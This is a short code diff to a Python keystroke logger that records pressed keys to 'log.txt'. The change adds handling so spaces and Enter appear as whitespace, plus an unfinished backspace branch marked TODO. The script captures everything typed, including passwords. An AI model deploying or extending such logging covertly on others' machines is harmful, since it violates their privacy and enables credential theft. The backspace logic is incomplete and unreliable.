@@ -20,14 +20,27 @@ def on_press(key):
 
 # Function to write the keys to a file
 def write_file(keys):
+    filename = 'log.txt'
     # Open the log file in write mode
-    with open('log.txt', 'w') as f:
+    with open(filename, 'w') as f:
         for key in keys:
             # Convert the key to a string and remove single quotes
             k = str(key).replace("'", "")
+            if key == Key.space:
+                f.write(" ")
+                continue
+            if key == Key.enter:
+                f.write("\n")
+                continue
+
+            #Todo implement backspace functionality
+            if key == Key.backspace:
+                with open(filename, 'r') as file:
+                    contents = file.read()
+                    print(contents)
             # Write the key to the file followed by a space
             f.write(k)
-            f.write(' ')
+            #f.write('')
 
 # Function to handle key release events
 def on_release(key):
